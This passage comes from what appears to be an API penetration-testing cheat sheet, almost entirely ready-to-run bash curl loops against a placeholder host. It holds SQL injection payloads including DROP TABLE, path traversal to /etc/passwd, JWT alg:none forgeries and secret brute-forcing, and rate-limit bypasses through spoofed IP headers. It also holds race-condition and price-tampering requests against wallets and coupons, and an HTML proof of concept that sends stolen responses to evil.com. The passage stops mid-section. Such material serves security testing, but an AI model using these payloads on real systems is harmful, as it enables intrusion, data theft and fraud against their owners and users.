for val in "" " " "  " "\t" "\n" "\0" null undefined "'" "\"" "\\" "<script>alert(1)</script>" "{{7*7}}" "${7*7}" "<%= 7*7 %>" "#{7*7}" "1' OR '1'='1" '1" OR "1"="1' "; select 1" "}{" "{{" "}}" "..%2F"; do
  curl -s "https://api.target.com/api/users?name=$val" \
    -H "Authorization: Bearer $TOKEN" \
    -w "\nname=$val -> %{http_code}\n"
done
```

### 10.2 Boundary Testing

```bash
# String length boundaries
for len in 0 1 10 100 255 256 512 1000 2048 4096 65535 65536 100000; do
  payload=$(python3 -c "print('A'*$len)")
  curl -s -X POST "https://api.target.com/api/users" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d "{\"name\":\"$payload\",\"email\":\"test@test.com\"}" \
    -w "\nLength $len -> %{http_code}\n"
done

# Number boundaries
for num in -9999999999999 -1 0 1 2147483647 2147483648 4294967295 4294967296 9223372036854775807 9223372036854775808 1.7976931348623157E+308 Infinity -Infinity NaN; do
  curl -s "https://api.target.com/api/users?offset=$num" \
    -H "Authorization: Bearer $TOKEN" \
    -w "\noffset=$num -> %{http_code}\n"
done
```

### 10.3 Array vs String Confusion

```bash
# Send array where string expected
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":["admin","user"],"email":"test@test.com"}'

# Send string where array expected
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"roles":"admin,user,editor","name":"test","email":"test@test.com"}'

# Send object where string expected
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":{"first":"admin","last":"user"},"email":"test@test.com"}'

# Send number where string expected
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":12345,"email":"test@test.com"}'

# Send boolean where string expected
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":true,"email":"test@test.com"}'
```

### 10.4 Null Injection

```bash
# Null values in various formats
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":null,"email":"test@test.com"}'

curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"test","email":null}'

curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"test","email":"test@test.com","role":null}'

# Null byte injection
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"test\u0000admin","email":"test@test.com"}'

curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"test%00admin","email":"test@test.com"}'
```

### 10.5 Special Characters Injection

```bash
# Unicode and special characters
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"test\u0000\u0008\u000c\u001f\u007f\u009f","email":"test@test.com"}'

# Emoji injection
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"test🔥admin🚀","email":"test@test.com"}'

# Right-to-left override
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"test\u202Eadmin","email":"test@test.com"}'

# Zero-width characters
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"test\u200Badmin\u200Cuser","email":"test@test.com"}'

# Newline injection in headers
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-Custom: test%0d%0aX-Injected: true" \
  -d '{"name":"test","email":"test@test.com"}'
```

### 10.6 JSON-Specific Fuzzing

```bash
# Invalid JSON
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{invalid json here}'

# JSON with comments (non-standard)
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{"name":"test" /* comment */, "email":"test@test.com"}'

# Trailing comma
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@test.com",}'

# Duplicate keys
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","name":"admin","email":"test@test.com"}'

# Very deep nesting
deep="{\"a\":"
for i in $(seq 1 100); do
  deep+="{\"a\":"
done
deep+="1"
for i in $(seq 1 100); do
  deep+="}"
done
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -d "$deep"

# JSON with prototype pollution
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"admin":true},"constructor":{"prototype":{"admin":true}},"name":"test","email":"test@test.com"}'
```

### 10.7 Fuzzing Headers

```bash
# Oversized headers
long_header=$(python3 -c "print('X'*10000)")
curl -s "https://api.target.com/api/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-Large: $long_header" \
  -w "\n%{http_code}\n"

# Duplicate headers
curl -s "https://api.target.com/api/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Authorization: Bearer FAKE_TOKEN" \
  -H "Authorization: " \
  -w "\n%{http_code}\n"

# Header injection
curl -s "https://api.target.com/api/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Forwarded-Host: localhost" \
  -H "X-Real-IP: 127.0.0.1" \
  -H "X-Originating-IP: 127.0.0.1" \
  -H "CF-Connecting-IP: 127.0.0.1" \
  -H "True-Client-IP: 127.0.0.1"
```

---

## 11. CORS Testing

### 11.1 Origin Reflection

```bash
# Test if Access-Control-Allow-Origin reflects any origin
curl -s -D - "https://api.target.com/api/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Origin: https://evil.com" \
  -o /dev/null

# Check response headers
curl -s -I "https://api.target.com/api/users" \
  -H "Origin: https://evil.com" \
  -H "Authorization: Bearer $TOKEN"

# Test with multiple origins
for origin in "https://evil.com" \
              "https://evilsite.com" \
              "http://evil.com" \
              "https://target.com.evil.com" \
              "https://evil-target.com" \
              "null" \
              "file://" \
              "http://localhost" \
              "http://192.168.1.1" \
              "https://target.com" \
              "https://www.target.com" \
              "https://sub.target.com"; do
  echo "=== Origin: $origin ==="
  curl -s -D - "https://api.target.com/api/users" \
    -H "Origin: $origin" \
    -H "Authorization: Bearer $TOKEN" \
    -o /dev/null 2>&1 | grep -i "access-control"
done
```

### 11.2 Credentials-Allowed Wildcard

```bash
# Check if ACAO is * but credentials are allowed
curl -s -D - "https://api.target.com/api/users" \
  -H "Origin: https://evil.com" \
  -H "Authorization: Bearer $TOKEN" \
  -o /dev/null | grep -iE "access-control|allow-credentials"

# Exploit verification: if ACAO: * AND ACAC: true, this is vulnerable
curl -s -D - "https://api.target.com/api/users" \
  -H "Origin: https://attacker.com" \
  -H "Authorization: Bearer $TOKEN" \
  -o /dev/null
```

### 11.3 Null Origin Bypass

```bash
# Test null origin
curl -s -D - "https://api.target.com/api/users" \
  -H "Origin: null" \
  -H "Authorization: Bearer $TOKEN" \
  -o /dev/null | grep -i "access-control"

# Data URI (triggers null origin in browsers)
curl -s -D - "https://api.target.com/api/users" \
  -H "Origin: null" \
  -o /dev/null | grep -i "access-control"

# Sandboxed iframe origin test
curl -s -D - "https://api.target.com/api/users" \
  -H "Origin: null" \
  -H "Authorization: Bearer $TOKEN" \
  -o /dev/null | grep -i "access-control"
```

### 11.4 Preflight Analysis

```bash
# OPTIONS preflight request
curl -s -X OPTIONS "https://api.target.com/api/users" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: DELETE" \
  -H "Access-Control-Request-Headers: authorization, x-custom" \
  -D - -o /dev/null

# Test preflight with various methods
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE CONNECT; do
  echo "=== Method: $method ==="
  curl -s -X OPTIONS "https://api.target.com/api/users" \
    -H "Origin: https://evil.com" \
    -H "Access-Control-Request-Method: $method" \
    -D - -o /dev/null | grep -i "access-control"
done

# Test preflight with custom headers
for header in "authorization" "x-api-key" "x-auth-token" "x-custom" "content-type" "accept"; do
  echo "=== Header: $header ==="
  curl -s -X OPTIONS "https://api.target.com/api/users" \
    -H "Origin: https://evil.com" \
    -H "Access-Control-Request-Method: GET" \
    -H "Access-Control-Request-Headers: $header" \
    -D - -o /dev/null | grep -i "access-control"
done
```

### 11.5 CORS Exploitation PoC

```html
<!-- CORS exploitation proof of concept -->
<html>
<body>
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://api.target.com/api/users/1');
  xhr.withCredentials = true;
  xhr.setRequestHeader('Authorization', 'Bearer TOKEN_HERE');
  xhr.onload = function() {
    fetch('https://evil.com/exfil?data=' + btoa(this.responseText));
  };
  xhr.send();
</script>
</body>
</html>
```

### 11.6 CORS on Non-Standard Ports

```bash
# Test CORS from various ports
for port in 80 443 8080 8443 3000 5000 8000 9000; do
  echo "=== Origin: http://evil.com:$port ==="
  curl -s -D - "https://api.target.com/api/users" \
    -H "Origin: http://evil.com:$port" \
    -o /dev/null | grep -i "access-control"
done
```

---

## 12. Rate Limit Testing

### 12.1 Rate Limit Detection

```bash
# Send requests until rate limited
for i in $(seq 1 100); do
  status=$(curl -s -o /dev/null -w "%{http_code}\n" \
    "https://api.target.com/api/users" \
    -H "Authorization: Bearer $TOKEN")
  echo "Request $i: $status"
  if [ "$status" = "429" ]; then
    echo "Rate limited after $i requests"
    break
  fi
done

# Check for rate limit headers
curl -s -D - "https://api.target.com/api/users" \
  -H "Authorization: Bearer $TOKEN" \
  -o /dev/null | grep -iE "x-rate|retry-after|429|limit|throttle"

# Measure rate limit window
start=$(date +%s)
rate_limited=false
while true; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://api.target.com/api/users" \
    -H "Authorization: Bearer $TOKEN")
  if [ "$code" = "429" ] && [ "$rate_limited" = false ]; then
    echo "Rate limited at $(($(date +%s) - start)) seconds"
    rate_limited=true
  fi
  if [ "$code" = "200" ] && [ "$rate_limited" = true ]; then
    echo "Unlimited at $(($(date +%s) - start)) seconds"
    break
  fi
done
```

### 12.2 Rate Limit Bypass Techniques

```bash
# Bypass via IP rotation (X-Forwarded-For)
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    "https://api.target.com/api/users" \
    -H "Authorization: Bearer $TOKEN" \
    -H "X-Forwarded-For: 192.168.1.$i"
done

# Bypass via header manipulation
for header in \
  "X-Forwarded-For: 127.0.0.1" \
  "X-Real-IP: 127.0.0.1" \
  "X-Originating-IP: 127.0.0.1" \
  "CF-Connecting-IP: 127.0.0.1" \
  "True-Client-IP: 127.0.0.1" \
  "X-Client-IP: 127.0.0.1" \
  "X-Remote-IP: 127.0.0.1" \
  "X-Remote-Addr: 127.0.0.1" \
  "X-Forwarded-Host: localhost" \
  "X-ProxyUser-Ip: 127.0.0.1"; do
  echo "=== $header ==="
  for i in $(seq 1 5); do
    curl -s -o /dev/null -w "%{http_code}\n" \
      "https://api.target.com/api/users" \
      -H "Authorization: Bearer $TOKEN" \
      -H "$header"
  done
done

# Bypass via header array (comma-separated IPs)
curl -s "https://api.target.com/api/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-Forwarded-For: 127.0.0.1, 10.0.0.1, 192.168.1.1"

# Bypass via case sensitivity
curl -s "https://api.target.com/api/users" \
  -H "authorization: bearer $TOKEN" \
  -H "x-forwarded-for: 127.0.0.1"
```

### 12.3 Rate Limit Bypass via HTTP Method

```bash
# Different methods may have different rate limits
for method in GET POST PUT PATCH DELETE; do
  echo "=== Method: $method ==="
  for i in $(seq 1 15); do
    curl -s -X $method "https://api.target.com/api/users" \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -d '{"name":"test","email":"test@test.com"}' \
      -o /dev/null -w "%{http_code}\n"
  done
done
```

### 12.4 Rate Limit Bypass via Versioning

```bash
# Different versions may have separate rate limit counters
for version in v1 v2 v3 beta api; do
  echo "=== Version: $version ==="
  for i in $(seq 1 20); do
    curl -s -o /dev/null -w "%{http_code}\n" \
      "https://api.target.com/$version/users" \
      -H "Authorization: Bearer $TOKEN"
  done
done
```

### 12.5 Rate Limit Bypass via Endpoint Variation

```bash
# Use case variation in endpoint
paths=(
  "api/users"
  "api/Users"
  "api/USERS"
  "api/user"
  "api/User"
  "api/v1/users"
  "api/v1/Users"
  "api/v1/user"
  "v1/api/users"
  "api/users/"
  "api/users?limit=10"
  "api/users?limit=10&offset=0"
)

for path in "${paths[@]}"; do
  curl -s "https://api.target.com/$path" \
    -H "Authorization: Bearer $TOKEN" \
    -o /dev/null -w "%{http_code}\n"
done
```

### 12.6 Distributed Brute Force

```bash
# Rotate through multiple IPs and user agents
for i in $(seq 1 100); do
  ip="10.0.0.$((i % 255 + 1))"
  ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/$i"
  curl -s -o /dev/null -w "%{http_code}\n" \
    "https://api.target.com/api/users" \
    -H "Authorization: Bearer $TOKEN" \
    -H "User-Agent: $ua" \
    -H "X-Forwarded-For: $ip" &
done
wait
```

### 12.7 GraphQL Rate Limit Bypass

```bash
# Send all queries in a single batch to bypass per-request limits
queries=""
for i in $(seq 1 100); do
  if [ $i -gt 1 ]; then queries+=","; fi
  queries+="{\"query\":\"{ user(id:$i) { email } }\"}"
done

curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d "[$queries]"

# Use aliases to request many items in one query
alias_query="{"
for i in $(seq 1 100); do
  alias_query+="u$i: user(id:$i) { id email name role }"
done
alias_query+="}"
curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d "{\"query\":\"$alias_query\"}"
```

---

## 13. API Documentation Discovery

### 13.1 Common Documentation Paths

```bash
# Swagger/OpenAPI paths
paths=(
  "/swagger.json"
  "/swagger.yaml"
  "/swagger.yml"
  "/swagger-ui.html"
  "/swagger-resources"
  "/api-docs"
  "/api-docs.json"
  "/api-docs.yaml"
  "/v1/api-docs"
  "/v2/api-docs"
  "/v3/api-docs"
  "/openapi.json"
  "/openapi.yaml"
  "/docs"
  "/docs.json"
  "/documentation"
  "/api/documentation"
  "/api/swagger"
  "/api/v1/swagger.json"
  "/api/v2/swagger.json"
  "/swagger/index.html"
  "/swagger-ui"
  "/swagger/ui"
  "/api/swagger-ui"
  "/api/swagger-ui.html"
  "/api/schema"
  "/schema"
  "/spec"
  "/api/spec"
  "/api/v1/spec"
  "/api.json"
  "/api.yaml"
  "/api.yml"
  "/openapi"
  "/api/openapi"
  "/api/v1/openapi"
  "/api/v2/openapi"
)

for path in "${paths[@]}"; do
  echo "=== $path ==="
  curl -s -o /dev/null -w "%{http_code}\n" "https://api.target.com$path"
done
```

### 13.2 Postman Discovery

```bash
# Postman-related endpoints
paths=(
  "/postman"
  "/postman.json"
  "/postman_collection.json"
  "/api/postman"
  "/api/collection"
  "/collection.json"
  "/export"
  "/api/export"
  "/api/v1/export"
)

for path in "${paths[@]}"; do
  echo "=== $path ==="
  curl -s "https://api.target.com$path" -w "\nHTTP: %{http_code}\n"
done

# Postman workspaces search
curl -s "https://api.getpostman.com/workspaces" \
  -H "X-API-Key: $POSTMAN_KEY"
```

### 13.3 GraphQL Discovery

```bash
# Common GraphQL endpoints
paths=(
  "/graphql"
  "/graphql/v1"
  "/gql"
  "/api/graphql"
  "/api/gql"
  "/graph"
  "/api/graph"
  "/query"
  "/api/query"
  "/v1/graphql"
  "/v2/graphql"
  "/graphiql"
  "/graphiql.html"
  "/api/graphiql"
  "/playground"
  "/api/playground"
  "/altair"
)

for path in "${paths[@]}"; do
  echo "=== $path ==="
  curl -s -X POST "https://api.target.com$path" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __typename }"}' \
    -w "\nHTTP: %{http_code}\n"
done
```

### 13.4 API Key Discovery in Documentation

```bash
# Check if API docs contain real API keys or tokens
curl -s "https://api.target.com/swagger.json" | \
  grep -iE "(api[_-]?key|token|secret|password|auth|bearer|jwt)"

curl -s "https://api.target.com/api-docs" | \
  grep -iE "(api[_-]?key|token|secret|password|auth|bearer|jwt)"

# Default credentials in docs
curl -s "https://api.target.com/swagger.json" | \
  grep -iE "(admin|password|demo|test|guest|default)"
```

### 13.5 Internal Endpoints via Documentation

```bash
# Extract all endpoints from discovered documentation
curl -s "https://api.target.com/swagger.json" | \
  jq '.paths | keys[]' 2>/dev/null

# Check for internal/admin endpoints in docs
curl -s "https://api.target.com/swagger.json" | \
  jq '.paths | keys[] | select(contains("admin") or contains("internal") or contains("debug") or contains("private"))' 2>/dev/null
```

### 13.6 WSDL Discovery (SOAP APIs)

```bash
# SOAP API discovery paths
paths=(
  "/?wsdl"
  "/service?wsdl"
  "/api?wsdl"
  "/soap"
  "/soap/"
  "/soap/v1"
  "/api/soap"
  "/webservice"
  "/WebService.asmx"
  "/WebService.asmx?wsdl"
  "/service.asmx"
  "/service.asmx?wsdl"
  "/api.asmx"
  "/api.asmx?wsdl"
  "/endpoint"
  "/endpoint.php?wsdl"
  "/api/endpoint?wsdl"
)

for path in "${paths[@]}"; do
  echo "=== $path ==="
  curl -s -o /dev/null -w "%{http_code}\n" "https://api.target.com$path"
done
```

---

## 14. Error Handling Analysis

### 14.1 Triggering Error Messages

```bash
# Invalid JSON to trigger parse errors
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{invalid}'

# Invalid data types
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"id":"abc","name":123,"email":true}'

# Missing required fields
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{}'

# Out of range values
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"test","email":"test@test.com","age":999}'

# Invalid enum values
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"test","email":"test@test.com","role":"nonexistent_role"}'
```

### 14.2 Stack Trace Leakage

```bash
# Trigger server errors to leak stack traces
endpoints_with_errors=(
  "https://api.target.com/api/users/0/../../../etc/passwd"
  "https://api.target.com/api/users/null"
  "https://api.target.com/api/users/undefined"
  "https://api.target.com/api/users/%s"
  "https://api.target.com/api/users/%d"
  "https://api.target.com/api/users/%x"
  "https://api.target.com/api/users/%n"
  "https://api.target.com/api/users/%00"
  "https://api.target.com/api/users/.json"
  "https://api.target.com/api/users/.xml"
)

for endpoint in "${endpoints_with_errors[@]}"; do
  echo "=== $endpoint ==="
  curl -s "$endpoint" | grep -iE "(error|exception|trace|stack|line|file|warning|fatal|debug)"
done
```

### 14.3 SQL Error Detection

```bash
# SQL injection to trigger SQL errors
payloads=(
  "'"
  "\""
  "1'"
  "1\""
  "' OR '1'='1"
  "\" OR \"1\"=\"1"
  "' OR 1=1--"
  "\" OR 1=1--"
  "'; SELECT 1; --"
  "'; DROP TABLE users; --"
  "' UNION SELECT 1,2,3--"
  "' AND 1=CONVERT(int, @@version)--"
  "1' AND 1=1--"
  "1' AND 1=2--"
  "1' ORDER BY 1--"
  "1' ORDER BY 10--"
  "' WAITFOR DELAY '0:0:5'--"
  "1; WAITFOR DELAY '0:0:5'--"
  "' OR SLEEP(5)--"
  "1' OR SLEEP(5)--"
)

for payload in "${payloads[@]}"; do
  response=$(curl -s "https://api.target.com/api/users?id=$payload" \
    -H "Authorization: Bearer $TOKEN")
  if echo "$response" | grep -qiE "(SQL|syntax|mysql|postgresql|oracle|sqlite|driver|ODBC|database error|DataBase|unclosed quotation|Incorrect syntax|Warning.*mysql)" 2>/dev/null; then
    echo "SQL Error with payload: $payload"
    echo "$response" | head -5
  fi
done
```

### 14.4 Verbose Error Information

```bash
# Look for server info in error responses
curl -s -D - "https://api.target.com/api/users/999999" \
  -H "Authorization: Bearer $TOKEN" \
  -o /dev/null | grep -iE "(server|powered-by|x-powered|x-aspnet|php|python|django|flask|node|express|nginx|apache|iis|tomcat|jetty|weblogic|websphere)"

# Error message verbosity analysis
curl -s "https://api.target.com/api/users/999999" \
  -H "Authorization: Bearer $TOKEN" | jq .

# Check for validation error details
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"","email":"invalid"}' | jq .
```

### 14.5 Debug Endpoint Discovery

```bash
# Common debug/info endpoints
paths=(
  "/debug"
  "/api/debug"
  "/debug/"
  "/_debug"
  "/__debug"
  "/info"
  "/api/info"
  "/api/status"
  "/status"
  "/health"
  "/api/health"
  "/healthz"
  "/readyz"
  "/metrics"
  "/api/metrics"
  "/actuator"
  "/actuator/health"
  "/actuator/info"
  "/actuator/metrics"
  "/actuator/env"
  "/actuator/beans"
  "/actuator/mappings"
  "/actuator/httptrace"
  "/actuator/heapdump"
  "/actuator/logfile"
  "/actuator/threaddump"
  "/actuator/configprops"
  "/actuator/conditions"
  "/api/actuator"
  "/phpinfo.php"
  "/info.php"
  "/server-status"
  "/server-info"
  "/env"
  "/api/env"
  "/config"
  "/api/config"
  "/configuration"
  "/api/configuration"
  "/settings"
  "/api/settings"
)

for path in "${paths[@]}"; do
  echo "=== $path ==="
  curl -s -o /dev/null -w "%{http_code}\n" "https://api.target.com$path"
done
```

### 14.6 HTTP Verb Error Analysis

```bash
# Different HTTP methods produce different error messages
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  echo "=== $method /api/users/1 ==="
  curl -s -X $method "https://api.target.com/api/users/1" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"name":"test"}' \
    -w "\nHTTP: %{http_code}\n"
done
```

---

## 15. JWT Token Testing

### 15.1 JWT Decoding and Inspection

```bash
# Decode JWT to inspect claims
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null || true
echo $TOKEN | cut -d. -f2 | python3 -c "import sys,base64,json; print(json.dumps(json.loads(base64.urlsafe_b64decode(sys.stdin.read() + '==')), indent=2))"

# Check JWT header
echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null || true
```

### 15.2 Algorithm Manipulation

```bash
# alg: none attack
# Header: {"alg":"none"}  Payload: {"sub":"1","role":"admin","iat":1516239022}
curl -s "https://api.target.com/api/admin/users" \
  -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."

# alg: None attack (capital N)
curl -s "https://api.target.com/api/admin/users" \
  -H "Authorization: Bearer eyJhbGciOiJOb25lIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."

# alg: nOnE case variation
curl -s "https://api.target.com/api/admin/users" \
  -H "Authorization: Bearer eyJhbGciOiJub25FIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."

# alg: NONE
curl -s "https://api.target.com/api/admin/users" \
  -H "Authorization: Bearer eyJhbGciOiJOT05FIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."
```

### 15.3 Weak HMAC Secret Bruteforce

```bash
# Test common weak secrets
secrets=("secret" "password" "key" "admin" "test" "jwt" "token" "123456" "key123" "mykey" "changeme" "s3cr3t")

# For each secret, generate token and test
for secret in "${secrets[@]}"; do
  # Generate JWT with HMAC-SHA256 using python
  token=$(python3 -c "
import jwt, time
token = jwt.encode({'sub': '1', 'role': 'admin', 'iat': int(time.time())}, '$secret', algorithm='HS256')
print(token)
")
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://api.target.com/api/admin/users" \
    -H "Authorization: Bearer $token")
  if [ "$response" != "401" ]; then
    echo "Potential weak secret '$secret' -> HTTP $response"
  fi
done
```

### 15.4 KID Injection

```bash
# kid header injection — path traversal
# Header: {"kid":"../../../etc/passwd","alg":"HS256"}
token_header=$(echo -n '{"kid":"../../../etc/passwd","alg":"HS256"}' | base64 | tr -d '=' | tr '+/' '-_')
token_payload=$(echo -n '{"sub":"1","role":"admin","iat":1516239022}' | base64 | tr -d '=' | tr '+/' '-_')
curl -s "https://api.target.com/api/admin/users" \
  -H "Authorization: Bearer $token_header.$token_payload."

# kid: /dev/null (empty secret)
token_header=$(echo -n '{"kid":"/dev/null","alg":"HS256"}' | base64 | tr -d '=' | tr '+/' '-_')
curl -s "https://api.target.com/api/admin/users" \
  -H "Authorization: Bearer $token_header.$token_payload."

# kid: SQL injection
token_header=$(echo -n '{"kid":"\" UNION SELECT 'a'","alg":"HS256"}' | base64 | tr -d '=' | tr '+/' '-_')
curl -s "https://api.target.com/api/admin/users" \
  -H "Authorization: Bearer $token_header.$token_payload."
```

### 15.5 JWK Injection

```bash
# JKU header pointing to attacker-controlled JWK set
# Generate your own RSA key pair and host the JWK at your server
jku_token="eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXZpbC5jb20vbXlqd2suanNvbiJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SIGNATURE"

curl -s "https://api.target.com/api/admin/users" \
  -H "Authorization: Bearer $jku_token"

# Embedded JWK in header
# Use a tool like jwk_to_token.py to generate
```

### 15.6 Token Expiration Testing

```bash
# Token with past expiration
past_token="eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwicm9sZSI6InVzZXIiLCJleHAiOjE1MTYyMzkwMjJ9.SIGNATURE"
curl -s "https://api.target.com/api/users" \
  -H "Authorization: Bearer $past_token"

# Token with no expiration
no_exp_header=$(echo -n '{"alg":"HS256","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
no_exp_payload=$(echo -n '{"sub":"1","role":"admin","iat":1516239022}' | base64 | tr -d '=' | tr '+/' '-_')
curl -s "https://api.target.com/api/admin/users" \
  -H "Authorization: Bearer $no_exp_header.$no_exp_payload.SIGNATURE"

# Token with far-future expiration
future_header=$(echo -n '{"alg":"HS256","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
future_payload=$(echo -n '{"sub":"1","role":"admin","iat":1516239022,"exp":9999999999}' | base64 | tr -d '=' | tr '+/' '-_')
curl -s "https://api.target.com/api/admin/users" \
  -H "Authorization: Bearer $future_header.$future_payload.SIGNATURE"
```

---

## 16. Business Logic Flaws

### 16.1 Race Conditions

```bash
# Coupon/ discount race condition
for i in $(seq 1 20); do
  curl -s -X POST "https://api.target.com/api/coupons/redeem" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"code":"SINGLE_USE_CODE"}' \
    -w "\nRequest $i: %{http_code}\n" &
done
wait

# Balance transfer race condition
for i in $(seq 1 10); do
  curl -s -X POST "https://api.target.com/api/wallet/transfer" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"to":"attacker","amount":100}' \
    -w "\nRequest $i: %{http_code}\n" &
done
wait

# Concurrent registration (account creation race)
for i in $(seq 1 5); do
  curl -s -X POST "https://api.target.com/api/auth/register" \
    -H "Content-Type: application/json" \
    -d "{\"name\":\"test$i\",\"email\":\"race$i@test.com\",\"password\":\"Pass123!\",\"referral_code\":\"AFKJ2L\"}" &
done
wait
```

### 16.2 Integer Overflow / Underflow

```bash
# Quantity overflow
curl -s -X POST "https://api.target.com/api/cart/add" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"product_id":1,"quantity":9999999999999999999999999999999}'

# Price manipulation
curl -s -X POST "https://api.target.com/api/cart/checkout" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"items":[{"id":1,"price":-999999}],"coupon":"NEGATIVE"}

# Negative quantities  
curl -s -X POST "https://api.target.com/api/cart/add" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"product_id":1,"quantity":-1}'
```

### 16.3 Coupon / Discount Abuse

```bash
# Repeated coupon application
for i in $(seq 1 10); do
  curl -s -X POST "https://api.target.com/api/checkout/apply-coupon" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"code":"WELCOME10"}'
done

# Stacking coupons
curl -s -X POST "https://api.target.com/api/checkout/apply-coupon" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"code":"WELCOME10&FREESHIPPING&EXTRA20"}'

# Coupon for another user
curl -s -X POST "https://api.target.com/api/checkout/apply-coupon" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"code":"WELCOME10","user_id":5}'
```

### 16.4 Order Manipulation

```bash
# Change order total
curl -s -X PATCH "https://api.target.com/api/orders/101" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"total":0.01,"status":"paid"}'

# Modify order after payment
